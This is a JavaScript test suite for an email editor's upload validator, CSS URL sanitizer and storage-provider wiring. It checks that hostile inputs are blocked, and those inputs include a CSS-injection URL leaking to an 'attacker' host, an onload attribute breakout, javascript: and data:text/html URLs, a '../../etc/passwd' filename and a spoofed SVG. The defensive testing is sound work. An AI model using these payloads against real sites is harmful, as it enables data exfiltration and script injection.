/**
 * Storage tests: the upload validator and EditorCore's provider wiring, driven
 * through a fake provider.
 *
 * No adapter is tested here because none ships: a host owns its adapter and
 * tests it against its own backend. What this file pins is the contract that
 * every such adapter plugs into.
 *
 * Run: npm test
 *
 * No test dependencies at all, by design. `storage-limits.js` needs only `Image`
 * and `URL.createObjectURL`, and `EditorCore` touches state rather than the DOM,
 * so the handful of stubs below covers both -- which also keeps this file honest
 * about how little of the DOM the storage path actually depends on.
 */
import assert from 'node:assert/strict';

const store = new Map();
globalThis.localStorage = {
  get length() { return store.size; },
  key: (i) => [...store.keys()][i],
  getItem: (k) => (store.has(k) ? store.get(k) : null),
  setItem: (k, v) => store.set(k, String(v)),
  removeItem: (k) => store.delete(k),
};
globalThis.sessionStorage = { getItem: () => null, setItem: () => {} };
globalThis.URL.createObjectURL = () => 'blob:stub';
globalThis.URL.revokeObjectURL = () => {};
globalThis.Image = class {
  set src(_) { queueMicrotask(() => { this.naturalWidth = 800; this.naturalHeight = 400; this.onload(); }); }
};

const { validateFiles, sanitizeName, acceptAttribute } = await import(new URL('../src/core/storage-limits.js', import.meta.url).href);
const { EditorCore } = await import(new URL('../src/core/editor-core.js', import.meta.url).href);
const { cssUrl } = await import(new URL('../src/core/sanitize.js', import.meta.url).href);

let passed = 0;
let failed = 0;
async function it(name, fn) {
  try { await fn(); passed++; console.log('  ok    ' + name); }
  catch (e) { failed++; console.log('  FAIL  ' + name + '\n        ' + String(e.message).split('\n').join('\n        ')); }
}

// Leading bytes of each format, which is what the validator actually reads.
const PNG = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13];
const JPEG = [0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46, 0, 1];
const GIF = [...'GIF89a'].map((c) => c.charCodeAt(0)).concat([1, 0, 1, 0, 0, 0]);
const WEBP = [...'RIFF'].map((c) => c.charCodeAt(0)).concat([0, 0, 0, 0], [...'WEBP'].map((c) => c.charCodeAt(0)));
const SVG = [...'<svg xmlns="h'].map((c) => c.charCodeAt(0));

const file = (name, head, extraBytes = 0, type = '') =>
  new File([new Uint8Array(head.concat(new Array(extraBytes).fill(0)))], name, { type });

const LIMITS = { accept: ['image/jpeg', 'image/png', 'image/gif'], maxBytes: 1024, maxWidth: 1600, maxHeight: 1600, maxFilesPerDrop: 3 };
const settle = () => new Promise((r) => setTimeout(r, 0));

console.log('\nUpload limits (host-set policy, no defaults)');

await it('no limits configured refuses every file', async () => {
  const r = await validateFiles([file('a.png', PNG)], null);
  assert.equal(r.accepted.length, 0);
  assert.equal(r.rejected[0].key, 'storage.errNoLimits');
});

await it('an empty accept list is a misconfiguration, not "allow everything"', async () => {
  const r = await validateFiles([file('a.png', PNG)], { accept: [], maxBytes: 10 });
  assert.equal(r.rejected[0].key, 'storage.errNoAccept');
});

await it('oversize is refused and the message carries both sizes', async () => {
  const r = await validateFiles([file('big.png', PNG, 2000)], LIMITS);
  assert.equal(r.rejected[0].key, 'storage.errTooLarge');
  assert.match(r.rejected[0].params.max, /1 KB/);
});

await it('an SVG renamed .png with a spoofed MIME type is caught by its bytes', async () => {
  const r = await validateFiles([file('photo.png', SVG, 0, 'image/png')], LIMITS);
  assert.equal(r.accepted.length, 0);
  assert.equal(r.rejected[0].key, 'storage.errFormat');
  assert.equal(r.rejected[0].params.type, 'SVG+XML');
});

await it('SVG needs allowSvg on top of being listed in accept', async () => {
  const accept = LIMITS.accept.concat('image/svg+xml');
  const refused = await validateFiles([file('logo.svg', SVG)], { ...LIMITS, accept });
  assert.equal(refused.rejected[0].key, 'storage.errSvg');
  const allowed = await validateFiles([file('logo.svg', SVG)], { ...LIMITS, accept, allowSvg: true });
  assert.equal(allowed.accepted.length, 1);
});

await it('a format left out of accept is named in the rejection', async () => {
  const r = await validateFiles([file('a.webp', WEBP)], LIMITS);
  assert.equal(r.rejected[0].params.type, 'WEBP');
});

await it('the dimension ceiling applies to the decoded image', async () => {
  const r = await validateFiles([file('a.png', PNG)], { ...LIMITS, maxWidth: 400 });
  assert.equal(r.rejected[0].key, 'storage.errDimensions');
  assert.equal(r.rejected[0].params.w, 800);
});

await it('the per-drop cap truncates and reports the overflow', async () => {
  const files = [1, 2, 3, 4, 5].map((n) => file(`a${n}.png`, PNG));
  const r = await validateFiles(files, LIMITS);
  assert.equal(r.accepted.length, 3);
  assert.equal(r.rejected.length, 2);
  assert.equal(r.rejected[0].key, 'storage.errTooMany');
});

await it('JPEG, PNG and GIF pass and carry their measured dimensions', async () => {
  const r = await validateFiles([file('a.png', PNG), file('b.jpg', JPEG), file('c.gif', GIF)], LIMITS);
  assert.deepEqual(r.accepted.map((a) => a.type), ['image/png', 'image/jpeg', 'image/gif']);
  assert.equal(r.accepted[0].w, 800);
});

await it('names are sanitised and the picker accept attribute tracks the limits', async () => {
  assert.equal(sanitizeName('../../etc/passwd'), '-..-etc-passwd');
  assert.equal(sanitizeName('.env'), 'env');
  assert.equal(acceptAttribute(LIMITS), 'image/jpeg,image/png,image/gif');
  assert.equal(acceptAttribute(null), 'image/*');
});

console.log('\nUntrusted asset URLs');

await it('a quote in a provider URL cannot escape the CSS declaration', async () => {
  const attack = 'https://cdn/a.png"); background: url(https://attacker/leak); --x: ("';
  const safe = cssUrl(attack);
  assert.equal(safe.includes('"'), false);
  assert.equal(safe.includes('('), false);
  assert.equal(safe.includes(')'), false);
  assert.match(safe, /^https:\/\/cdn\/a\.png/);
});

await it('a quote cannot break out of the style attribute in exported email', async () => {
  // The exporter writes this into style="..." -- a raw quote would end the
  // attribute and turn the rest into markup in someone's campaign.
  assert.equal(cssUrl('https://cdn/a.png" onload="alert(1)').includes('"'), false);
});

await it('whitespace and newlines are encoded, not passed through', async () => {
  assert.equal(/\s/.test(cssUrl('https://cdn/a b.png')), false);
  assert.equal(/[\r\n]/.test(cssUrl('https://cdn/a\n.png')), false);
});

await it('only schemes an image can load from are allowed', async () => {
  assert.equal(cssUrl('javascript:alert(1)'), '');
  assert.equal(cssUrl('data:text/html,<script>'), '');
  assert.match(cssUrl('data:image/png;base64,AAA'), /^data:image\/png/);
  assert.match(cssUrl('https://cdn/a.png'), /^https:/);
  assert.match(cssUrl('blob:https://host/abc'), /^blob:/);
});

await it('a relative path has no scheme and stays usable', async () => {
  assert.equal(cssUrl('/media/hero.png'), '/media/hero.png');
});

await it('an empty url yields nothing rather than a request to the page itself', async () => {
  assert.equal(cssUrl(''), '');
  assert.equal(cssUrl(null), '');
  assert.equal(cssUrl(undefined), '');
});

console.log('\nEditorCore wiring (any host-written provider)');

const fakeProvider = (over = {}) => ({
  folders: async () => [{ id: 'd1', name: 'Brand' }, { id: 'd2', name: 'Product' }],
  list: async () => ({ items: [{ id: 'a', name: 'a.png', url: 'https://cdn/a.png', size: 10 }], cursor: 'c2' }),
  upload: async (f) => ({ id: 'up-' + f.name, name: f.name, url: 'https://cdn/' + f.name, size: f.size }),
  remove: async () => {},
  ...over,
});
const PNG_LIMITS = { accept: ['image/png'], maxBytes: 4096 };

await it('with no provider the seeded library and its counts are untouched', async () => {
  const core = new EditorCore();
  assert.equal(core.state.assets.length, 6);
  assert.deepEqual(core.folderOptions().map((f) => f.name), ['All files', 'Brand', 'Product', 'Photography', 'Uploads']);
  assert.equal(core.folderOptions()[0].count, 6);
});

await it('assigning a provider replaces the seeded library with the backend page', async () => {
  const core = new EditorCore();
  core.setStorageProvider(fakeProvider());
  await settle();
  assert.deepEqual(core.state.assets.map((a) => a.id), ['a']);
  assert.equal(core.state.assetCursor, 'c2');
  assert.deepEqual(core.folderOptions().map((f) => f.name), ['All files', 'Brand', 'Product']);
  assert.equal(core.folderOptions()[1].count, null, 'a paged backend cannot claim a per-folder count');
});

await it('clearing the provider restores the built-in behaviour', async () => {
  const core = new EditorCore();
  core.setStorageProvider(fakeProvider());
  await settle();
  core.setStorageProvider(null);
  assert.equal(core.state.assets.length, 6);
});

await it('with a provider, assets stay out of localStorage', async () => {
  const core = new EditorCore();
  core.setStorageProvider(fakeProvider());
  await settle();
  core.persist();
  assert.deepEqual(JSON.parse(store.get('mailcraft.v3')).assets, []);
});

await it('a superseded listing cannot overwrite the current one', async () => {
  let resolveSlow;
  const core = new EditorCore();
  core.setStorageProvider(fakeProvider({
    folders: async () => [{ id: 'd1', name: 'Brand' }],
    list: async ({ folderId }) => (folderId === 'd1'
      ? new Promise((r) => { resolveSlow = () => r({ items: [{ id: 'stale', name: 's', url: 'u', size: 1 }], cursor: null }); })
      : { items: [{ id: 'fresh', name: 'f', url: 'u', size: 1 }], cursor: null }),
  }));
  await settle();
  core.setAssetFolder('d1');
  await settle();
  core.setAssetFolder('d2');
  await settle();
  resolveSlow();
  await settle();
  assert.deepEqual(core.state.assets.map((a) => a.id), ['fresh']);
});

await it('a provider with no limits refuses to upload rather than defaulting', async () => {
  const core = new EditorCore();
  const toasts = [];
  core.flash = (m) => toasts.push(m);
  core.setStorageProvider(fakeProvider());
  await settle();
  await core.addFiles([file('hero.png', PNG, 0, 'image/png')]);
  assert.equal(core.state.assets.length, 1, 'nothing was uploaded');
  assert.match(toasts.join(' '), /has not set any upload limits/);
});

await it('validated files upload through the provider, newest first', async () => {
  const core = new EditorCore();
  core.flash = () => {};
  core.setStorageProvider(fakeProvider());
  core.setStorageLimits(PNG_LIMITS);
  await settle();
  await core.addFiles([file('hero.png', PNG, 0, 'image/png'), file('second.png', PNG, 0, 'image/png')]);
  assert.deepEqual(core.state.assets.map((a) => a.id), ['up-hero.png', 'up-second.png', 'a']);
  assert.equal(core.state.assets[0].w, 800, 'dimensions measured during validation survive into the asset');
  assert.equal(core.state.uploading, 0);
});

await it('a failed upload reports the reason and adds nothing', async () => {
  const core = new EditorCore();
  const toasts = [];
  core.flash = (m) => toasts.push(m);
  core.setStorageProvider(fakeProvider({ upload: async () => { throw new Error('gateway said no'); } }));
  core.setStorageLimits(PNG_LIMITS);
  await settle();
  await core.addFiles([file('hero.png', PNG, 0, 'image/png')]);
  assert.equal(core.state.assets.length, 1);
  assert.match(toasts.join(' '), /gateway said no/);
  assert.equal(core.state.uploading, 0, 'the progress counter unwinds even when the upload throws');
});

await it('a failed delete does not fake the removal', async () => {
  const core = new EditorCore();
  const toasts = [];
  core.flash = (m) => toasts.push(m);
  core.setStorageProvider(fakeProvider({ remove: async () => { throw new Error('403'); } }));
  await settle();
  await core.removeAsset(core.state.assets[0]);
  assert.equal(core.state.assets.length, 1, 'the tile stays when the backend refused');
  assert.match(toasts.join(' '), /could not be deleted/);
});

await it('a successful delete drops the tile', async () => {
  const core = new EditorCore();
  core.flash = () => {};
  core.setStorageProvider(fakeProvider());
  await settle();
  await core.removeAsset(core.state.assets[0]);
  assert.equal(core.state.assets.length, 0);
});

await it('a provider set without limits warns at assignment, not at first upload', async () => {
  const core = new EditorCore();
  const warned = [];
  const realWarn = console.warn;
  console.warn = (m) => warned.push(m);
  core.setStorageProvider(fakeProvider());
  await settle();
  console.warn = realWarn;
  assert.match(warned.join(' '), /storageLimits is not/);
});

await it('setting limits in the same tick as the provider warns about nothing', async () => {
  const core = new EditorCore();
  const warned = [];
  const realWarn = console.warn;
  console.warn = (m) => warned.push(m);
  core.setStorageProvider(fakeProvider());
  core.setStorageLimits(PNG_LIMITS);   // the normal two-line host wiring
  await settle();
  console.warn = realWarn;
  assert.deepEqual(warned, []);
});

await it('a superseded listing is actually aborted, not just discarded', async () => {
  const seen = [];
  const core = new EditorCore();
  core.setStorageProvider(fakeProvider({
    folders: async () => [{ id: 'd1', name: 'Brand' }],
    list: async ({ signal }) => { seen.push(signal); return { items: [], cursor: null }; },
  }));
  await settle();
  core.setAssetFolder('d1');
  await settle();
  assert.equal(seen.length, 2);
  assert.equal(seen[0].aborted, true, 'the first listing was cancelled when the folder changed');
  assert.equal(seen[1].aborted, false, 'the listing that replaced it is still live');
});

await it('uploads run concurrently but land in the order they were dropped', async () => {
  const core = new EditorCore();
  core.flash = () => {};
  let inFlight = 0;
  let peak = 0;
  core.setStorageProvider(fakeProvider({
    upload: async (f) => {
      peak = Math.max(peak, ++inFlight);
      await new Promise((r) => setTimeout(r, f.name === 'a.png' ? 20 : 0));
      inFlight--;
      return { id: 'up-' + f.name, name: f.name, url: 'u', size: f.size };
    },
  }));
  core.setStorageLimits(PNG_LIMITS);
  await settle();
  await core.addFiles(['a.png', 'b.png', 'c.png'].map((n) => file(n, PNG, 0, 'image/png')));
  assert.equal(peak > 1, true, 'more than one upload was in flight');
  assert.deepEqual(core.state.assets.slice(0, 3).map((a) => a.id), ['up-a.png', 'up-b.png', 'up-c.png'],
    'the slowest file was dropped first, so it must still be listed first');
});

await it('an incomplete provider is rejected loudly at assignment', async () => {
  const core = new EditorCore();
  const warned = [];
  const realWarn = console.warn;
  console.warn = (m) => warned.push(m);
  core.setStorageProvider({ list: () => {} });
  console.warn = realWarn;
  assert.equal(core.storageProvider, null);
  assert.match(warned.join(' '), /missing upload/);
});

console.log(`\n${passed} passed, ${failed} failed.`);
if (failed) process.exit(1);
